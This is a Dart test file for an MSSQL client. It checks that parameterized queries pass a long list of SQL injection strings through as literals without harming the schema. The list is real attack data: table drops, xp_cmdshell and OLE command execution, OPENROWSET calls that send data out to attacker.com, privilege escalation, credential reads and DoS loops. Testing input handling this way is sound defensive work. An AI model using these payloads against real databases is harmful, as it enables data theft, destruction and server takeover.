import 'package:test/test.dart';

import 'test_utils.dart';

/// Enhanced, comprehensive SQL injection tests converted from the UI helper.
///
/// This suite validates that parameterized queries safely handle a wide range
/// of MSSQL-specific injection vectors without executing unintended commands.
void main() {
  group('MssqlClient - Enhanced SQL Injection Security', () {
    final harness = TempDbHarness();

    setUpAll(() async {
      await harness.init();
      await harness.execute(
        "CREATE TABLE dbo.TestUsers (id INT IDENTITY(1,1) PRIMARY KEY, username NVARCHAR(50), email NVARCHAR(100), age INT)",
      );
    });

    tearDownAll(() async {
      await harness.dispose();
    });

    test('table exists', () async {
      final t = parseRows(
        await harness.query(
          "SELECT COUNT(*) AS cnt FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='TestUsers'",
        ),
      );
      expect(t.first['cnt'], 1);
    });

    test('basic insert with params', () async {
      final username = 'test_user_${DateTime.now().millisecondsSinceEpoch}';
      final affected = affectedCount(
        await harness.executeParams(
          'INSERT INTO dbo.TestUsers (username, email, age) VALUES (@u, @e, @a)',
          {'u': username, 'e': 'test@example.com', 'a': 25},
        ),
      );
      expect(affected, 1);

      final rows = parseRows(
        await harness.executeParams(
          'SELECT TOP 5 * FROM dbo.TestUsers WHERE age > @minAge',
          {'minAge': 20},
        ),
      );
      expect(rows.isNotEmpty, true);
    });

    group('comprehensive attack vectors', () {
      // Converted comprehensive vector list
      final maliciousInputs = <String>[
        // BASIC INJECTION ATTEMPTS
        "'; DROP TABLE TestUsers; --",
        "' OR '1'='1",
        "' UNION SELECT null--",
        "' UNION SELECT @@version--",
        "' UNION SELECT DB_NAME()--",
        "' UNION SELECT USER_NAME()--",

        // ENCODING BYPASS ATTACKS
        "%27; DROP TABLE TestUsers; --%00",
        "%2527; DROP TABLE TestUsers; --%00",
        "&#39;; DROP TABLE TestUsers; --",
        "%u0027; DROP TABLE TestUsers; --",
        "%27 OR %271%27=%271",
        "%2527 OR %25271%2527=%25271",

        // WHITESPACE BYPASS ATTACKS
        "'%09UNION%09SELECT%09null--",
        "'%0AUNION%0ASELECT%0Anull--",
        "'%0DUNION%0DSELECT%0Dnull--",
        "'%0CUNION%0CSELECT%0Cnull--",
        "'%0BUNION%0BSELECT%0Bnull--",
        "'%A0UNION%A0SELECT%A0null--",
        "'%20UNION%20SELECT%20null--",

        // COMMENT VARIATIONS
        "'; DROP TABLE TestUsers#",
        "'; DROP TABLE TestUsers/**/",
        "'; DROP TABLE TestUsers/*comment*/",
        "'; DROP TABLE TestUsers/*! */",

        // CASE MANIPULATION
        "'; dRoP tAbLe TestUsers; --",
        "'; UnIoN sElEcT @@version; --",
        "'; eXeC xp_cmdshell 'dir'; --",
        "'; wAiTfOr DeLaY '00:00:05'; --",

        // STRING CONCATENATION BYPASS
        "'; DROP TABLE Test'+'Users; --",
        "'; EXEC('DROP TABLE TestUsers'); --",
        "'; DECLARE @sql NVARCHAR(MAX); SET @sql = 'DROP TABLE TestUsers'; EXEC(@sql); --",

        // CHAR/ASCII BYPASS
        "'; EXEC(CHAR(68)+CHAR(82)+CHAR(79)+CHAR(80)+CHAR(32)+CHAR(84)+CHAR(65)+CHAR(66)+CHAR(76)+CHAR(69)+CHAR(32)+CHAR(84)+CHAR(101)+CHAR(115)+CHAR(116)+CHAR(85)+CHAR(115)+CHAR(101)+CHAR(114)+CHAR(115)); --",
        "'; SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110); --",

        // TIME-BASED BLIND
        "'; WAITFOR DELAY '00:00:05'; --",
        "'; IF (1=1) WAITFOR DELAY '00:00:03'; --",
        "'; IF (ASCII(SUBSTRING(@@version,1,1))>64) WAITFOR DELAY '00:00:03'; --",
        "'; IF (LEN((SELECT TOP 1 name FROM sysdatabases))>5) WAITFOR DELAY '00:00:03'; --",
        "'; IF EXISTS(SELECT * FROM sysobjects WHERE name='TestUsers') WAITFOR DELAY '00:00:03'; --",

        // ERROR-BASED
        "'; SELECT 1/0; --",
        "'; SELECT CONVERT(int, @@version); --",
        "'; SELECT CAST(@@version AS int); --",
        "'; SELECT 1/(SELECT COUNT(*) FROM sysobjects WHERE name='nonexistent'); --",
        "'; SELECT CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')); --",

        // INFORMATION GATHERING
        "'; SELECT @@version; --",
        "'; SELECT DB_NAME(); --",
        "'; SELECT USER_NAME(); --",
        "'; SELECT @@SERVERNAME; --",
        "'; SELECT @@SERVICENAME; --",
        "'; SELECT * FROM INFORMATION_SCHEMA.ROUTINES; --",
        "'; SELECT * FROM INFORMATION_SCHEMA.PARAMETERS; --",
        "'; SELECT * FROM sys.sql_modules; --",
        "'; SELECT name FROM sysobjects WHERE xtype='U'; --",
        "'; SELECT name FROM sysdatabases; --",
        "'; SELECT name FROM sysusers; --",
        "'; SELECT name FROM syscolumns WHERE id=OBJECT_ID('TestUsers'); --",

        // UNION-BASED
        "'; UNION SELECT null,null,null--",
        "'; UNION SELECT @@version,null,null--",
        "'; UNION SELECT DB_NAME(),null,null--",
        "'; UNION SELECT USER_NAME(),null,null--",
        "'; UNION SELECT * FROM (SELECT TOP 1 * FROM (SELECT TOP 1 * FROM sysobjects) AS a) AS b; --",
        "'; WITH cte AS (SELECT name FROM sysobjects) SELECT * FROM cte; --",

        // STACKED QUERIES
        "'; INSERT INTO TestUsers (username, email, age) VALUES ('hacked', 'hacked@evil.com', 0); --",
        "'; UPDATE TestUsers SET username='hacked' WHERE id=1; --",
        "'; DELETE FROM TestUsers WHERE id=1; --",
        "'; BEGIN TRANSACTION; DELETE FROM TestUsers; ROLLBACK; --",
        "'; BEGIN TRANSACTION; UPDATE TestUsers SET username='hacked'; COMMIT; --",

        // EXTENDED STORED PROCEDURES
        "'; EXEC xp_cmdshell 'dir'; --",
        "'; EXEC xp_dirtree 'C:\\'; --",
        "'; EXEC xp_fileexist 'C:\\Windows\\System32\\cmd.exe'; --",

        // OLE AUTOMATION
        "'; DECLARE @result int; EXEC sp_OACreate 'WScript.Shell', @result OUTPUT; --",
        "'; DECLARE @result int; EXEC sp_OAMethod @result, 'Run', null, 'cmd.exe /c dir'; --",

        // XML-BASED
        "'; SELECT * FROM TestUsers FOR XML AUTO; --",
        "'; SELECT * FROM TestUsers FOR XML PATH; --",
        "'; SELECT * FROM TestUsers FOR XML EXPLICIT; --",
        "'; DECLARE @xml XML; SET @xml = '<root>evil</root>'; SELECT @xml.value('(/root)[1]', 'varchar(100)'); --",
        "'; SELECT CAST('<root><child>data</child></root>' AS XML).query('/root/child'); --",

        // DNS EXFILTRATION
        "'; SELECT * FROM OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=attacker.com;UID=sa;PWD=;','SELECT @@version'); --",
        "'; SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=').master.dbo.sysdatabases; --",

        // PRIVILEGE ESCALATION
        "'; EXEC sp_addsrvrolemember 'everyone', 'sysadmin'; --",
        "'; EXEC sp_addrolemember 'db_owner', 'public'; --",
        "'; EXEC sp_password null, 'newpass', 'sa'; --",

        // HEAVY QUERIES (DoS attempts)
        "'; SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c; --",
        "'; WAITFOR DELAY '00:00:30'; --",
        "'; WHILE(1=1) BEGIN SELECT @@version END; --",
        "'; WITH recursive_cte(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM recursive_cte WHERE n < 10000) SELECT * FROM recursive_cte OPTION (MAXRECURSION 0); --",

        // ADVANCED SYSTEM QUERIES
        "'; SELECT loginname FROM master..sysprocesses; --",
        "'; SELECT name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb'); --",
        "'; SELECT @@SERVERNAME, @@SERVICENAME; --",
        "'; SELECT SERVERPROPERTY('MachineName'); --",
        "'; SELECT SERVERPROPERTY('InstanceName'); --",
        "'; SELECT * FROM sys.credentials; --",
        "'; SELECT name FROM sys.server_principals WHERE type = 'C'; --",

        // BULK OPERATIONS
        "'; BULK INSERT TestUsers FROM 'c:\\temp\\evil.txt'; --",
        "'; SELECT * INTO TempHacked FROM TestUsers; --",

        // BACKUP/RESTORE ATTACKS
        "'; BACKUP DATABASE master TO DISK='c:\\temp\\stolen.bak'; --",
        "'; RESTORE DATABASE evil FROM DISK='c:\\temp\\malicious.bak'; --",

        // SERVICE BROKER ATTACKS
        "'; CREATE QUEUE EvilQueue; --",
        "'; CREATE SERVICE EvilService ON QUEUE EvilQueue; --",

        // AGENT JOB MANIPULATION
        "'; EXEC msdb.dbo.sp_add_job @job_name = 'EvilJob'; --",
        "'; EXEC msdb.dbo.sp_add_jobstep @job_name = 'EvilJob', @step_name = 'EvilStep', @command = 'cmd.exe /c dir'; --",

        // TRACE/PROFILER MANIPULATION
        "'; EXEC sp_trace_create @traceid OUTPUT; --",
        "'; SELECT * FROM fn_trace_getinfo(1); --",

        // FULL-TEXT SEARCH ATTACKS
        "'; SELECT * FROM sys.fulltext_catalogs; --",
        "'; SELECT FULLTEXTCATALOGPROPERTY('catalog', 'ItemCount'); --",

        // PARTITION FUNCTION ATTACKS
        "'; SELECT * FROM sys.partition_functions; --",
        "'; SELECT * FROM sys.partition_schemes; --",

        // COMPUTED COLUMN ATTACKS
        "'; ALTER TABLE TestUsers ADD computed_col AS (SELECT @@version); --",

        // GEOMETRY/GEOGRAPHY ATTACKS
        "'; SELECT geometry::STGeomFromText('POINT(1 1)', 0); --",

        // HIERARCHYID ATTACKS
        "'; SELECT CAST('/1/2/3/' AS hierarchyid); --",

        // JSON ATTACKS
        "'; SELECT JSON_VALUE('{\"name\":\"evil\"}', '\$.name'); --",
        "'; SELECT * FROM OPENJSON('{\"users\":[{\"name\":\"admin\",\"pass\":\"secret\"}]}'); --",

        // CURSOR-BASED ATTACKS
        "'; DECLARE cursor_name CURSOR FOR SELECT name FROM sysobjects; OPEN cursor_name; --",

        // FUNCTION INJECTION
        "'; SELECT dbo.fn_listextendedproperty(default,default,default,default,default,default,default); --",
        "'; SELECT OBJECT_NAME(@@PROCID); --",
        "'; SELECT APP_NAME(); --",
        "'; SELECT HOST_NAME(); --",
        "'; SELECT CONNECTIONPROPERTY('protocol_type'); --",

        // METADATA EXTRACTION
        "'; SELECT * FROM sys.triggers; --",
        "'; SELECT * FROM sys.foreign_keys; --",
        "'; SELECT * FROM sys.check_constraints; --",
        "'; SELECT * FROM sys.filegroups WHERE type = 'FD'; --",
        "'; SELECT * FROM sys.filetables; --",

        // ASSEMBLY/CLR ATTACKS
        "'; CREATE ASSEMBLY evil FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000; --",
      ];

      test(
        'each vector is treated as literal and does not harm schema',
        () async {
          var safeCount = 0;
          for (var i = 0; i < maliciousInputs.length; i++) {
            final input = maliciousInputs[i];
            // Parameterized query must not execute injected commands
            await harness.executeParams(
              'SELECT * FROM dbo.TestUsers WHERE username = @u',
              {'u': input},
            );
            // Ensure table still exists
            final t = parseRows(
              await harness.query(
                "SELECT COUNT(*) AS cnt FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='TestUsers'",
              ),
            );
            expect(t.first['cnt'], 1);
            safeCount++;
          }
          // Sanity: all should be safe
          expect(safeCount, maliciousInputs.length);
        },
      );
    });
  });
}
